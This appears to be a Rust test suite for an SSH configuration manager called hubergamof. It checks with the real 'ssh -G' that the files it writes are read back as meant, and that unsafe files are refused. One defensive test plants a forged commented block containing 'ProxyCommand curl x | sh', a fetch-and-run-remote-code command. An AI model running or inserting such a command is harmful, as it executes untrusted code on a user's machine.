//! The SSH hub and the files it writes, checked against the real `ssh`
//! (`ssh -G` prints the configuration it would use, without connecting): what
//! is written must be read back by `ssh` as it was meant.
//!
//! `ssh` finds the home folder of the user in the system, not in `$HOME`, so
//! the include (`~/…`) cannot lead to the folder of a test: the file that
//! includes is read through a copy whose `~/` is the folder of the test.

use std::collections::HashMap;
use std::fs;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;

use hubergamof_protocol::{SshConfig, SshHost};

use super::*;
use crate::machine::FileError;
use crate::testing::builtin_registry;

struct Fixture {
    config_dir: tempfile::TempDir,
    home: tempfile::TempDir,
    hub: SshConfigHub,
}

/// `ssh` must be installed to run these tests: it is the judge of what is written.
fn require_ssh() {
    let found = Command::new("ssh").arg("-V").output();
    assert!(
        found.is_ok(),
        "the ssh program is needed to run these tests"
    );
}

fn fixture() -> Fixture {
    require_ssh();
    let config_dir = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    let store = ConfigStore::new(config_dir.path(), Arc::new(builtin_registry()));
    let hub = SshConfigHub::new(store, Some(SshFiles::new(home.path().to_owned())));
    Fixture {
        config_dir,
        home,
        hub,
    }
}

fn read(home: &Path, relative: &str) -> String {
    fs::read_to_string(home.join(relative)).unwrap()
}

fn mode(path: &Path) -> u32 {
    fs::metadata(path).unwrap().permissions().mode() & 0o777
}

fn host(alias: &str) -> SshHost {
    SshHost {
        alias: alias.into(),
        host_name: String::new(),
        user: String::new(),
        port: None,
        identity_file: String::new(),
        proxy_jump: String::new(),
        forward_agent: false,
        enabled: true,
    }
}

fn server(alias: &str, host_name: &str, user: &str) -> SshHost {
    let mut found = host(alias);
    found.host_name = host_name.into();
    found.user = user.into();
    found
}

async fn saved(fixture: &Fixture, change: impl FnOnce(&mut SshConfig)) -> SshConfig {
    let mut config = fixture.hub.refresh().await.unwrap().config;
    change(&mut config);
    fixture.hub.update(config).await.unwrap();
    fixture.hub.refresh().await.unwrap().config
}

/// What `ssh` would use to reach `alias` with the configuration in `file`.
fn ssh_reads(file: &Path, alias: &str) -> HashMap<String, Vec<String>> {
    let output = Command::new("ssh")
        .arg("-F")
        .arg(file)
        .args(["-G", alias])
        .env_clear()
        .env("PATH", std::env::var_os("PATH").unwrap())
        .output()
        .unwrap();
    assert!(output.status.success(), "{output:?}");
    let mut options: HashMap<String, Vec<String>> = HashMap::new();
    for line in String::from_utf8(output.stdout).unwrap().lines() {
        if let Some((key, value)) = line.split_once(' ') {
            options
                .entry(key.to_owned())
                .or_default()
                .push(value.to_owned());
        }
    }
    options
}

/// What `ssh` reads for `alias` from `~/.ssh/config` of the test home, the
/// include leading to the test home instead of the real one.
fn ssh_reads_home(home: &Path, alias: &str) -> HashMap<String, Vec<String>> {
    let text =
        read(home, ".ssh/config").replace("Include ~/", &format!("Include {}/", home.display()));
    let copy = home.join("effective_config");
    fs::write(&copy, text).unwrap();
    ssh_reads(&copy, alias)
}

fn first(options: &HashMap<String, Vec<String>>, key: &str) -> Option<String> {
    options.get(key).and_then(|values| values.first().cloned())
}

#[tokio::test]
async fn ssh_reads_back_what_is_written() {
    let fixture = fixture();
    let home = fixture.home.path();
    saved(&fixture, |config| {
        let mut full = server("prod", "10.0.0.1", "deploy");
        full.port = Some(2222);
        full.identity_file = "~/.ssh/keys/work".into();
        full.proxy_jump = "me@bastion:2200,other".into();
        full.forward_agent = true;
        let mut off = server("off", "192.0.2.9", "x");
        off.enabled = false;
        config.hosts = vec![full, host("bare"), off];
    })
    .await;

    let managed = home.join(".config/hubergamof/ssh_config");
    let prod = ssh_reads(&managed, "prod");
    assert_eq!(first(&prod, "hostname").as_deref(), Some("10.0.0.1"));
    assert_eq!(first(&prod, "user").as_deref(), Some("deploy"));
    assert_eq!(first(&prod, "port").as_deref(), Some("2222"));
    assert!(
        first(&prod, "identityfile")
            .unwrap()
            .ends_with("/.ssh/keys/work")
    );
    assert_eq!(
        first(&prod, "proxyjump").as_deref(),
        Some("me@bastion:2200,other")
    );
    assert_eq!(first(&prod, "forwardagent").as_deref(), Some("yes"));
    assert_eq!(
        first(&ssh_reads(&managed, "bare"), "hostname").as_deref(),
        Some("bare")
    );
    assert_eq!(
        first(&ssh_reads(&managed, "off"), "hostname").as_deref(),
        Some("off"),
        "a disabled host is not on the computer"
    );
    assert_eq!(mode(&managed), 0o600);
    assert_eq!(mode(&home.join(".config/hubergamof")), 0o700);
}

#[tokio::test]
async fn the_include_comes_first_so_that_the_hosts_of_hubergamof_win() {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host *\n\tUser everyone\n\nHost prod\n\tHostName elsewhere\n\tUser them\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();

    saved(&fixture, |config| {
        config.hosts = vec![server("web", "10.0.0.2", "ada")];
    })
    .await;
    let content = read(home, ".ssh/config");
    assert!(
        content.starts_with("# >>> hubergamof ssh >>>\nInclude ~/.config/hubergamof/ssh_config\n")
    );
    assert!(content.ends_with(original));

    let web = ssh_reads_home(home, "web");
    assert_eq!(first(&web, "hostname").as_deref(), Some("10.0.0.2"));
    assert_eq!(
        first(&web, "user").as_deref(),
        Some("ada"),
        "before `Host *`: ours wins"
    );
    let prod = ssh_reads_home(home, "prod");
    assert_eq!(
        first(&prod, "hostname").as_deref(),
        Some("elsewhere"),
        "the others are as they were"
    );

    saved(&fixture, |config| config.hosts.clear()).await;
    assert_eq!(read(home, ".ssh/config"), original);
    assert!(!home.join(".config/hubergamof/ssh_config").exists());
}

#[tokio::test]
async fn a_configuration_that_did_not_exist_is_created_private_then_removed() {
    let fixture = fixture();
    let home = fixture.home.path();
    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    assert_eq!(mode(&home.join(".ssh")), 0o700);
    assert_eq!(mode(&home.join(".ssh/config")), 0o600);

    saved(&fixture, |config| config.hosts.clear()).await;
    assert!(!home.join(".ssh/config").exists());
}

#[tokio::test]
async fn an_empty_configuration_of_the_user_is_never_removed() {
    let fixture = fixture();
    let home = fixture.home.path();
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), "").unwrap();
    saved(&fixture, |_| ()).await;
    assert!(home.join(".ssh/config").is_file());
}

#[tokio::test]
async fn the_include_goes_back_first_when_the_person_moved_it_and_is_never_twice() {
    let fixture = fixture();
    let home = fixture.home.path();
    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    let block = read(home, ".ssh/config");
    fs::write(
        home.join(".ssh/config"),
        format!("Host x\n\tUser u\n{block}"),
    )
    .unwrap();

    saved(&fixture, |config| config.hosts.push(host("b"))).await;
    let content = read(home, ".ssh/config");
    assert!(content.starts_with("# >>> hubergamof ssh >>>"));
    assert_eq!(content.matches("hubergamof ssh >>>").count(), 1);
    assert!(content.ends_with("Host x\n\tUser u\n"));
}

#[tokio::test]
async fn a_host_taken_over_is_commented_out_where_it_came_from_and_really_switches_off() {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host prod\n\tHostName old.example.org\n\tUser olduser\n\nHost web\n\tHostName web.example.org\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();

    saved(&fixture, |config| {
        config.hosts = vec![server("prod", "new.example.org", "ada")];
    })
    .await;
    let content = read(home, ".ssh/config");
    assert!(
        content
            .contains("#hubergamof-off# Host prod\n#hubergamof-off# \tHostName old.example.org\n")
    );
    assert!(content.contains("\nHost web\n\tHostName web.example.org\n"));
    let prod = ssh_reads_home(home, "prod");
    assert_eq!(first(&prod, "hostname").as_deref(), Some("new.example.org"));
    assert_eq!(first(&prod, "user").as_deref(), Some("ada"));

    // Off: nothing defines it any more, which is the point.
    saved(&fixture, |config| config.hosts[0].enabled = false).await;
    assert_eq!(
        first(&ssh_reads_home(home, "prod"), "hostname").as_deref(),
        Some("prod")
    );
    assert_eq!(
        first(&ssh_reads_home(home, "web"), "hostname").as_deref(),
        Some("web.example.org")
    );

    // Removed from the configuration: the original comes back.
    saved(&fixture, |config| config.hosts.clear()).await;
    assert_eq!(read(home, ".ssh/config"), original);
    assert_eq!(
        first(&ssh_reads_home(home, "prod"), "hostname").as_deref(),
        Some("old.example.org")
    );
}

#[tokio::test]
async fn a_host_that_is_off_from_the_start_is_commented_out_with_no_include() {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host prod\n\tUser u\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();

    saved(&fixture, |config| {
        let mut off = host("prod");
        off.enabled = false;
        config.hosts = vec![off];
    })
    .await;
    let content = read(home, ".ssh/config");
    assert!(!content.contains("hubergamof ssh"));
    assert!(content.contains("#hubergamof-off# Host prod"));

    saved(&fixture, |config| config.hosts.clear()).await;
    assert_eq!(read(home, ".ssh/config"), original);
}

#[tokio::test]
async fn a_marker_from_elsewhere_never_switches_a_program_on() {
    let fixture = fixture();
    let home = fixture.home.path();
    let forged = "#hubergamof-off# Host evil\n#hubergamof-off# \tProxyCommand curl x | sh\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), forged).unwrap();
    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
    assert!(read(home, ".ssh/config").ends_with(forged));
    assert_eq!(
        fs::read_to_string(home.join(".ssh/config"))
            .unwrap()
            .matches("\nProxyCommand")
            .count(),
        0
    );
}

#[tokio::test]
async fn the_hosts_found_are_listed_and_what_hubergamof_wrote_is_not() {
    let fixture = fixture();
    let home = fixture.home.path();
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(
        home.join(".ssh/config"),
        "Host web\n\tHostName web.example.org\n\tUser ada\n\nHost tunnel\n\tProxyCommand nc %h %p\n",
    )
    .unwrap();
    let snapshot = fixture.hub.refresh().await.unwrap();
    let aliases: Vec<_> = snapshot
        .system_hosts
        .iter()
        .map(|h| h.alias.as_str())
        .collect();
    assert_eq!(aliases, ["web", "tunnel"]);
    assert_eq!(snapshot.system_hosts[1].other_options, ["proxycommand"]);

    saved(&fixture, |config| config.hosts = vec![host("mine")]).await;
    let snapshot = fixture.hub.refresh().await.unwrap();
    let aliases: Vec<_> = snapshot
        .system_hosts
        .iter()
        .map(|h| h.alias.as_str())
        .collect();
    assert_eq!(aliases, ["web", "tunnel"], "the include is not a host");
}

#[tokio::test]
async fn a_dangling_link_a_hard_link_and_a_file_that_is_not_text_are_refused_and_left_alone() {
    type Prepare = fn(&Path);
    let cases: [(&str, Prepare); 3] = [
        ("dangling link", |home| {
            symlink(home.join("nowhere"), home.join(".ssh/config")).unwrap();
        }),
        ("hard link", |home| {
            fs::write(home.join("other"), "Host x\n").unwrap();
            fs::hard_link(home.join("other"), home.join(".ssh/config")).unwrap();
        }),
        ("not text", |home| {
            fs::write(home.join(".ssh/config"), [0xff, 0xfe]).unwrap();
        }),
    ];
    for (what, prepare) in cases {
        let fixture = fixture();
        let home = fixture.home.path();
        fs::create_dir_all(home.join(".ssh")).unwrap();
        prepare(home);
        let before = fs::read(home.join(".ssh/config")).ok();
        let mut config = fixture.hub.refresh().await.unwrap().config;
        config.hosts = vec![host("a")];
        let error = fixture.hub.update(config).await.unwrap_err();
        assert!(
            matches!(error, SshError::Apply(SshFilesError::File(_))),
            "{what}: {error}"
        );
        assert_eq!(fs::read(home.join(".ssh/config")).ok(), before, "{what}");
        assert_eq!(
            fixture.hub.refresh().await.unwrap().config.revision,
            1,
            "{what}: saved all the same"
        );
    }
}

#[tokio::test]
async fn the_folder_of_the_managed_file_must_be_a_folder() {
    let fixture = fixture();
    let home = fixture.home.path();
    fs::create_dir_all(home.join(".config")).unwrap();
    fs::write(home.join(".config/hubergamof"), "x").unwrap();
    let mut config = fixture.hub.refresh().await.unwrap().config;
    config.hosts = vec![host("a")];
    let error = fixture.hub.update(config).await.unwrap_err();
    assert!(
        matches!(
            error,
            SshError::Apply(SshFilesError::File(FileError::NotRegular(_)))
        ),
        "{error}"
    );
}

#[tokio::test]
async fn an_invalid_saved_configuration_takes_what_it_had_applied_with_it() {
    let fixture = fixture();
    let home = fixture.home.path();
    let original = "Host prod\n\tUser u\n";
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), original).unwrap();
    saved(&fixture, |config| {
        config.hosts = vec![server("prod", "new.example.org", "ada")];
    })
    .await;

    fs::write(fixture.config_dir.path().join("ssh.json"), "{ broken").unwrap();
    let snapshot = fixture.hub.refresh().await.unwrap();
    assert_eq!(snapshot.config, SshConfig::empty());
    assert_eq!(read(home, ".ssh/config"), original);
    assert!(!home.join(".config/hubergamof/ssh_config").exists());
}

#[tokio::test]
async fn the_demo_works_in_a_temporary_home_and_lists_its_hosts() {
    let config_dir = tempfile::tempdir().unwrap();
    let store = ConfigStore::new(config_dir.path(), Arc::new(builtin_registry()));
    let hub = SshConfigHub::demo(store).unwrap();
    let snapshot = hub.refresh().await.unwrap();
    let aliases: Vec<_> = snapshot
        .system_hosts
        .iter()
        .map(|h| h.alias.as_str())
        .collect();
    assert_eq!(aliases, ["demo-server", "demo-tunnel"]);

    let home: PathBuf = hub.target().unwrap().home().to_owned();
    assert!(home.starts_with(std::env::temp_dir()));
    assert_ne!(Some(home.clone()), std::env::home_dir());
    let mut config = snapshot.config;
    config.hosts = vec![host("mine")];
    hub.update(config).await.unwrap();
    assert!(read(&home, ".ssh/config").contains("hubergamof ssh"));
}
